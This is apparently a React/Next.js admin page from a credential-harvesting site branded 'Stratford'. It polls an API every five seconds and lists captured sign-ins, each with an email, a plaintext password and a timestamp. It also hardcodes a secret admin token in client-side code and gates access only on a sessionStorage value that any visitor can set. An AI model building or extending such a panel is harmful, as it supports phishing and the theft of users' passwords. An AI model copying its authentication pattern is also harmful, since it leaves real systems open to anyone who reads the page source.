import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import styles from '../styles/Admin.module.css';

const ADMIN_SESSION_KEY = 'stratford_admin_auth';

export default function Admin() {
  const router = useRouter();
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    // Must be client-side before touching sessionStorage
    const token = sessionStorage.getItem(ADMIN_SESSION_KEY);
    if (token !== 'granted') {
      router.replace('/');
      return;
    }
    setMounted(true);
    fetchEntries();
    const interval = setInterval(fetchEntries, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchEntries = async () => {
    try {
      const res = await fetch('/api/entries', {
        headers: { 'x-admin-token': 'stratford-admin-secret-x9k2' }
      });
      const data = await res.json();
      setEntries(data.entries || []);
    } catch (_) {}
    setLoading(false);
  };

  const handleExit = () => {
    sessionStorage.removeItem(ADMIN_SESSION_KEY);
    router.push('/');
  };

  const formatDate = (iso) => {
    if (!iso) return '—';
    return new Date(iso).toLocaleString();
  };

  // Don't render until client confirms auth — avoids flash/blank
  if (!mounted) return null;

  return (
    <>
      <Head>
        <title>Admin · Stratford</title>
      </Head>
      <div className={`${styles.page} ${styles.visible}`}>
        <div className={styles.grid} aria-hidden="true" />

        <div className={styles.shell}>
          <div className={styles.topbar}>
            <div className={styles.topLeft}>
              <div className={styles.badge}>
                <span className={styles.dot} />
                ADMIN PANEL
              </div>
              <h1 className={styles.title}>Access Log</h1>
            </div>
            <div className={styles.topRight}>
              <div className={styles.count}>{entries.length} <span>entries</span></div>
              <button className={styles.back} onClick={handleExit}>← Exit</button>
            </div>
          </div>

          <div className={styles.tableWrap}>
            {loading ? (
              <div className={styles.empty}>Loading…</div>
            ) : entries.length === 0 ? (
              <div className={styles.empty}>
                <div className={styles.emptyIcon}>◌</div>
                <p>No entries yet.</p>
                <p className={styles.emptyHint}>Logins will appear here as users sign in.</p>
              </div>
            ) : (
              <table className={styles.table}>
                <thead>
                  <tr>
                    <th>#</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {entries.map((e, i) => (
                    <tr key={i}>
                      <td className={styles.num}>{i + 1}</td>
                      <td className={styles.email}>{e.email}</td>
                      <td className={styles.code}>{e.code}</td>
                      <td className={styles.time}>{formatDate(e.timestamp)}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </div>

          <div className={styles.footer}>
            Auto-refreshes every 5 seconds · Admin view only
          </div>
        </div>
      </div>
    </>
  );
}
